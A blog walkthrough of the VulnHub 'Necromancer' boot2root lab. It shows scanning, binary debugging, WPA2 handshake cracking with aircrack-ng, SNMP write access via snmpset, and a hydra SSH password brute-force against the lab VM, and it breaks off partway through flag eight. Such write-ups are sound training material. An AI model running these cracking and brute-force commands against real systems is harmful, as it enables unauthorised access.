---
layout: post
title: "Necromancer hacking challenge"
date: 2016-09-04 09:36:28 -0400
comments: true
categories: boot2root
---

During the Labour Day long weekend I decided to download a handful of [VulnHub](https://vulnhub.com) boot2roots. I had heard some good things about [Necromancer](https://www.vulnhub.com/entry/the-necromancer-1,154/), so I thought I'd give it a shot! It's marked as a beginner level, but I started to realize that it was quite different from most boot2roots I'd tackled in the past. 

The initial port scan showed that port 666/UDP was open. 

```
# onetwopunch.sh -t ip -i eth1 -p all -n "-sV -A"
                             _                                          _       _ 
  ___  _ __   ___           | |___      _____    _ __  _   _ _ __   ___| |__   / \
 / _ \| '_ \ / _ \          | __\ \ /\ / / _ \  | '_ \| | | | '_ \ / __| '_ \ /  /
| (_) | | | |  __/ ᕦ(ò_óˇ)ᕤ | |_ \ V  V / (_) | | |_) | |_| | | | | (__| | | /\_/ 
 \___/|_| |_|\___|           \__| \_/\_/ \___/  | .__/ \__,_|_| |_|\___|_| |_\/   
                                                |_|                               
                                                                   by superkojiman

[+] Protocol : all
[+] Interface: eth1
[+] Nmap opts: -sV -A
[+] Targets  : ip
[+] Scanning 172.16.146.140 for all ports...
[+] Obtaining all open TCP ports using unicornscan...
[+] unicornscan -i eth1 -mT 172.16.146.140:a -l /root/.onetwopunch/udir/172.16.146.140-tcp.txt
[!] No TCP ports found
[+] Obtaining all open UDP ports using unicornscan...
[+] unicornscan -i eth1 -mU 172.16.146.140:a -l /root/.onetwopunch/udir/172.16.146.140-udp.txt
[*] UDP ports for nmap to scan: 666,
[+] nmap -e eth1 -sV -A -sU -oX /root/.onetwopunch/ndir/172.16.146.140-udp.xml -oG /root/.onetwopunch/ndir/172.16.146.140-udp.grep -p 666, 172.16.146.140

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-09-05 00:24 EDT
Nmap scan report for 172.16.146.140
Host is up (0.00032s latency).
PORT    STATE SERVICE VERSION
666/udp open  doom?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-UDP:V=7.25BETA1%I=7%D=9/5%Time=57CCF3A5%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20ou
SF:t!\n")%r(DNSVersionBindReq,27,"You\x20gasp\x20for\x20air!\x20Time\x20is
SF:\x20running\x20out!\n")%r(DNSStatusRequest,27,"You\x20gasp\x20for\x20ai
SF:r!\x20Time\x20is\x20running\x20out!\n")%r(NBTStat,27,"You\x20gasp\x20fo
SF:r\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Help,27,"You\x20gasp\x
SF:20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(SIPOptions,27,"You
SF:\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Sqlping,
SF:27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(N
SF:TPRequest,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20ou
SF:t!\n")%r(SNMPv1public,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20r
SF:unning\x20out!\n")%r(SNMPv3GetRequest,27,"You\x20gasp\x20for\x20air!\x2
SF:0Time\x20is\x20running\x20out!\n")%r(xdmcp,27,"You\x20gasp\x20for\x20ai
SF:r!\x20Time\x20is\x20running\x20out!\n")%r(AFSVersionRequest,27,"You\x20
SF:gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(DNS-SD,27,"Y
SF:ou\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(Citrix
SF:,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out!\n")%r(
SF:Kerberos,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20running\x20out
SF:!\n")%r(sybaseanywhere,27,"You\x20gasp\x20for\x20air!\x20Time\x20is\x20
SF:running\x20out!\n")%r(NetMotionMobility,27,"You\x20gasp\x20for\x20air!\
SF:x20Time\x20is\x20running\x20out!\n");
MAC Address: 00:0C:29:8D:15:7F (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 172.16.146.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.09 seconds
[+] Scans completed
[+] Results saved to /root/.onetwopunch
```


Connecting to it, I received the following string: 

```
You gasp for air! Time is running out!
```

Sending any data would result in the same string being printed out.

After trying various things in vain, I fired up wireshark to see if anything was happening over the network. Lo and behold, something *was* being sent to port 4444 on all IP addresses on the local network:

```
1325    300.770911122   172.16.146.140  172.16.146.139  TCP 66  20684→4444 [ACK] Seq=1426 Ack=2 Win=16384 Len=0 TSval=731717382 TSecr=6714285
```

I setup a netcat listener on port 4444 and eventually the following message was received:

```
# nc -lvp 4444
listening on [any] 4444 ...
172.16.146.140: inverse host lookup failed: Unknown host
connect to [172.16.146.139] from (UNKNOWN) [172.16.146.140] 3988
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```

It was Base64 encoded. Decoding it revealed the following text: 

```
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

Got the first of eleven flags. It hinted that I needed to pass the flag to port 666/UDP. 

```
You gasp for air! Time is running out!
flag1{e6078b9b1aac915d11b9fd59791030bf}
Chant is too long! You gasp for air!
e6078b9b1aac915d11b9fd59791030bf
Chant had no affect! Try in a different tongue!
```

Ok... I decided to Google that string, and one of the first hits was from [md5cracker](http://md5cracker.org/decrypted-md5-hash/e6078b9b1aac915d11b9fd59791030bf). It turned out that it was the MD5 hash for "opensesame". So I tried that, and boom:

```
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Got the second flag!. The message stated that port 80 was now open. 

Browsing to the server on port 80 showed some text and an image. I ran nikto on the target but nothing of interest came up. I decided to look into the image a little. I ran it through a hex editor and noticed that there was something called feathers.txt and that it was in some compressed image:

```
00009080: ff d9 50 4b 03 04 14 00 00 00 08 00 e5 5c a9 48  ..PK.........\.H
00009090: a1 c0 c5 9a 79 00 00 00 7d 00 00 00 0c 00 1c 00  ....y...}.......
000090a0: 66 65 61 74 68 65 72 73 2e 74 78 74 55 54 09 00  feathers.txtUT..
000090b0: 03 3d ea 2f 57 3f ea 2f 57 75 78 0b 00 01 04 00  .=./W?./Wux.....
000090c0: 00 00 00 04 00 00 00 00 05 c1 bb 0e 82 30 14 00  .............0..
000090d0: d0 dd af 69 4a 88 61 60 50 6a 6b 49 ee 6d 60 a0  ...iJ.a`PjkI.m`.
000090e0: 8f ad 60 42 91 56 17 e3 e3 7e bd e7 84 f2 4d 81  ..`B.V...~....M.
000090f0: f0 68 ac dc 81 7b 0e 65 dc 90 eb 1a 2c fc 8c d2  .h...{.e....,...
00009100: dc 88 0b 21 9d 3e 20 a0 46 e1 c9 d8 d0 e8 8e ad  ...!.> .F.......
00009110: 43 d5 bf 97 0a d6 9b 4a 59 2b 7c 7a 87 2f ad 24  C......JY+|z./.$
00009120: d3 5d 93 66 2b 1f d1 e2 b6 94 bc 07 3e a5 e5 7a  .].f+.......>..z
00009130: ce de f5 e4 dd c8 a2 9a ee 51 49 9a 87 b6 3d fc  .........QI...=.
00009140: 01 50 4b 01 02 1e 03 14 00 00 00 08 00 e5 5c a9  .PK...........\.
00009150: 48 a1 c0 c5 9a 79 00 00 00 7d 00 00 00 0c 00 18  H....y...}......
00009160: 00 00 00 00 00 01 00 00 00 a4 81 00 00 00 00 66  ...............f
00009170: 65 61 74 68 65 72 73 2e 74 78 74 55 54 05 00 03  eathers.txtUT...
00009180: 3d ea 2f 57 75 78 0b 00 01 04 00 00 00 00 04 00  =./Wux..........
00009190: 00 00 00 50 4b 05 06 00 00 00 00 01 00 01 00 52  ...PK..........R
000091a0: 00 00 00 bf 00 00 00 00 00                       .........
```

Using binwalk, I was able to extract the zip file and the text file:

```
# binwalk -e pileoffeathers.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
# cd _pileoffeathers.jpg.extracted
# ls -l
total 8
-rw-r--r-- 1 root root 295 Sep  3 17:47 9082.zip
-rw-r--r-- 1 root root 125 May  8 21:39 feathers.txt

# cat feathers.txt 
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
```

Another Base64 encoded string. Decoding it revealed the following:

```
# cat feathers.txt 
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==

# cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

Got the third flag, and a pointer on where to look next. This time the site hinted that I needed a magical item. I examined the image attached to the site but found nothing of interest. With nothing else to go on, I decided to run a directory scan using gobuster:

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.146.140/amagicbridgeappearsatthechasm/

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://172.16.146.140/amagicbridgeappearsatthechasm/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
=====================================================
/talisman (Status: 200)
=====================================================
```

Something called talisman showed up. Browsing to the directory revealed that it was actually a binary, so I downloaded it for further examination. Using radare2, I disassembled the binary and noticed it used a lot of mov statements. I also found several interesting functions:

```
0x08048420    4 43   -> 40   sym.frame_dummy
0x0804844b    4 82           sym.unhide
0x0804849d    4 87           sym.hide
0x080484f4    1 53           sym.myPrintf
0x08048529    1 1024         sym.wearTalisman
0x08048a13    1 36           sym.main
0x08048a37    1 1024         sym.chantToBreakSpell
```

The function chantToBreakSpell() wasn't being called anywhere. I couldn't find any strings, because they were all encoded, but could be decoded using the unhide() function. So when a string had to be printed, it would call myPrintf(), which in turn would call unhide() to print the string, and then encode it again with the hide() function right before exiting myPrintf(). The trick seemed to be to redirect execution of the program to chantToBreakSpell(). There are several ways to do this. What I did was to break at the return instruction at the end of main() in gdb, and then modify ESP to point to  chantToBreakSpell() so main() would return to it. 

Once there, I set a breakpoint at the call to unhide() in myPrintf():

```
0x080484fd      e849ffffff     call sym.unhide
```

This function takes two parameters according to gdb. The first parameter is a pointer to the string to decode, which is what we want. So I took note of the pointer, executed unhide(), and checked the contents of the pointer to view the decoded string. Eventually within chantToBreakSpell(), this happened:

```
0x08048502 in myPrintf ()
gdb-peda$ x/s 0xff94fb94
0xff94fb94: "flag4{ea50536158db50247e110a6c89fcf3d3}\n"
```

Got the fourth flag! I kept stepping through the function and it revealed another clue:

```
gdb-peda$ x/s 0xff94fc0c
0xff94fc0c: "Chant these words at u31337\n"
```

Ok, so this seemed to imply that I should connect to 31337/UDP and send the flag. As before, I found that I had to find the plaintext to the MD5 hash before the service on port 31337 would accept it. In this case, it was "blackmagic":

```
# nc -v -u 172.16.146.140 31337
172.16.146.140: inverse host lookup failed: Unknown host
(UNKNOWN) [172.16.146.140] 31337 (?) open
ea50536158db50247e110a6c89fcf3d3
Chant had no affect! Try in a different tongue!
blackmagic


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

Great, got the fifth flag, as well as the next destination. I pointed my browser to http://172.16.146.140/thenecromancerwillabsorbyoursoul and received the sixth flag along with the next clue. Because I'm too lazy to do screenshots right now, here's the HTTP reply from BurpSuite instead: 

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 1697
Content-Type: text/html
Date: Sun, 04 Sep 2016 00:33:51 GMT
Last-Modified: Tue, 10 May 2016 19:29:47 GMT
Server: OpenBSD httpd


<html>
  <head>
    <title>The Door</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<br><br>
    You continue to make your way through the cave.<br><br>
    In the distance you can see a familiar flicker of light moving in and out of the shadows. <br><br>
    As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.<br><br>
    You move closer, and then stop frozen with fear.<br><br>
    It's the <a href="./necromancer">necromancer!</a><br><br>
   <img src="../pics/necromancer.jpg">
    <p><font size=2>Image copyright:<a href="http://www.deviantart.com/art/The-Warlock-Necromancer-339634655" target=_blank> Manzanedo</a></font>
</p><br><br><br>
    Again he stares at you with deathly hollow eyes.  <br><br>
    He is standing in a doorway; a staff in one hand, and an object in the other.  <br><br>
    Smirking, the necromancer holds the staff and the object in the air.<br><br>
    He points his staff in your direction, and the stench of death and decay begins to fill the air.<br><br>
    You stare into his eyes and then.......<br><br><br><br><br><br><br><br><br>
    ...... darkness.  You open your eyes and find yourself lying on the damp floor of the cave.<br><br>
    The amulet must have saved you from whatever spell the necromancer had cast.<br><br>
    You stand to your feet.  Behind you, only darkness.<br><br>
    Before you, a large door with the symbol of a skull engraved into the surface. <br><br>
    Looking closer at the skull, you can see u161 engraved into the forehead.<br><br>
    </font>
  </body>
</html>
```

So a couple of things here. First off, a link to a file called necromancer, and a newly opened port: 161/UDP. 161/UDP is typically associated with SNMP. Things were starting to get interesting. I downloaded the necromancer file and found that it was a bzip2 file. 

```
# file necromancer 
necromancer: bzip2 compressed data, block size = 900k
```

So I uncompressed it which gave me the following:

```
# tar xvjf necromancer 
necromancer.cap
# file necromancer.cap 
necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
```

A pcap file. I loaded it up into Wireshark for examination and found that it was a wifi capture that had captured a WPA2 handshake. I ran it against aircrack-ng and got the password using the wordlist at [https://download.g0tmi1k.com/wordlists/wifi/renderlab-Church_of_Wifi-9-final-wordlist.zip](https://download.g0tmi1k.com/wordlists/wifi/renderlab-Church_of_Wifi-9-final-wordlist.zip):

```
                                 Aircrack-ng 1.2 rc4

      [00:03:40] 246028/996354 keys tested (1121.24 k/s) 

      Time left: 11 minutes, 9 seconds                          24.69%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```

Now the SSID for this network was called COMMUNITY, and being that port 161/UDP is SNMP, and to query SNMP we need the community string... well, I figured this must be the community string for the SNMP service. So I decided to give it a go, and it worked:

```
# snmpwalk -v1 -c death2all 172.16.146.140
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
End of MIB
```

death2allrw looks like another community string to try, and sure enough it generated a lot of output! 

```
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (50855) 0:08:28.55
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
.
.
.
```

Looking through the output, I found some interesting things:

```
iso.3.6.1.2.1.25.4.2.1.5.11745 = ""
iso.3.6.1.2.1.25.4.2.1.5.12933 = STRING: "/root/scripts/flag6.sh"
iso.3.6.1.2.1.25.4.2.1.5.13209 = ""
iso.3.6.1.2.1.25.4.2.1.5.14516 = STRING: "std.9600 ttyC0"
iso.3.6.1.2.1.25.4.2.1.5.14627 = STRING: "std.9600 ttyC1"
iso.3.6.1.2.1.25.4.2.1.5.15031 = ""
iso.3.6.1.2.1.25.4.2.1.5.15186 = STRING: "std.9600 ttyC5"
iso.3.6.1.2.1.25.4.2.1.5.15935 = STRING: "-u root -I -ipv6"
iso.3.6.1.2.1.25.4.2.1.5.17400 = ""
iso.3.6.1.2.1.25.4.2.1.5.19224 = ""
iso.3.6.1.2.1.25.4.2.1.5.19696 = ""
iso.3.6.1.2.1.25.4.2.1.5.20066 = ""
iso.3.6.1.2.1.25.4.2.1.5.21073 = ""
iso.3.6.1.2.1.25.4.2.1.5.22002 = ""
iso.3.6.1.2.1.25.4.2.1.5.22416 = ""
iso.3.6.1.2.1.25.4.2.1.5.22656 = STRING: "std.9600 ttyC2"
iso.3.6.1.2.1.25.4.2.1.5.22941 = STRING: "/root/scripts/flag5.sh"
iso.3.6.1.2.1.25.4.2.1.5.23840 = ""
iso.3.6.1.2.1.25.4.2.1.5.24256 = ""
iso.3.6.1.2.1.25.4.2.1.5.25388 = STRING: "-c /bin/sh /root/scripts/flag5.sh"
```

This community string death2allrw implied that I had read+write access to modify the SNMP settings. So I modified the string "Locked - death2allrw" to "Unlocked - death2allrw" to see what would happen:

```
# snmpset -v1 -c death2allrw 172.16.146.140 iso.3.6.1.2.1.1.6.0 s 'Unlocked - death2allrw!'
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked - death2allrw!"
```

Query the service again:

```
# snmpwalk -v1 -c death2all 172.16.146.140
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
End of MIB
```

Nice! It worked, and I got the seventh flag, along with a clue that port 22/TCP was now open. That's typically SSH, so I connected to see what would happen.

```
# ssh necromancer@172.16.146.140
The authenticity of host '172.16.146.140 (172.16.146.140)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.146.140' (ECDSA) to the list of known hosts.
necromancer@172.16.146.140's password: 
Permission denied, please try again.
```

Ok it was open. The flag is the MD5 hash for demonslayer. Assuming that was the user ID, I decided to run a brute force attack on the SSH server using hydra:

```
# hydra -l demonslayer -t 8 -P /usr/share/wordlists/rockyou.txt -e nsr -VV -o hydra.ssh 172.16.146.140 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-04 18:20:54
[DATA] max 8 tasks per 1 server, overall 64 tasks, 14344402 login tries (l:1/p:14344402), ~28016 tries per task
[DATA] attacking service ssh on port 22
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "demonslayer" - 1 of 14344402 [child 0]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "" - 2 of 14344402 [child 1]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "reyalsnomed" - 3 of 14344402 [child 2]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "123456" - 4 of 14344402 [child 3]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "12345" - 5 of 14344402 [child 4]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "123456789" - 6 of 14344402 [child 5]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "password" - 7 of 14344402 [child 6]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "iloveyou" - 8 of 14344402 [child 7]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "princess" - 9 of 14344402 [child 4]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "1234567" - 10 of 14344402 [child 5]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "rockyou" - 11 of 14344402 [child 3]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "12345678" - 12 of 14344402 [child 4]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "abc123" - 13 of 14344402 [child 3]
[ATTEMPT] target 172.16.146.140 - login "demonslayer" - pass "nicole" - 14 of 14344402 [child 5]
[22][ssh] host: 172.16.146.140   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-09-04 18:20:57
```

Perfect! The password for demonslayer was 12345678, so I quickly logged in to see what I was up against. 

```
# ssh demonslayer@172.16.146.140
demonslayer@172.16.146.140's password: 

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

$ id
uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
```

Doing a directory listing, I saw the eighth flag, and checked out its contents:

```
$ ls -la
total 40
drwxr-xr-x  3 demonslayer  demonslayer  512 Jun 23 05:38 .
drwxr-xr-x  3 root         wheel        512 May 11 18:25 ..
-rw-r--r--  1 demonslayer  demonslayer   87 May 11 18:25 .Xdefaults
-rw-r--r--  1 demonslayer  demonslayer  773 May 11 18:25 .cshrc
-rw-r--r--  1 demonslayer  demonslayer  103 May 11 18:25 .cvsrc
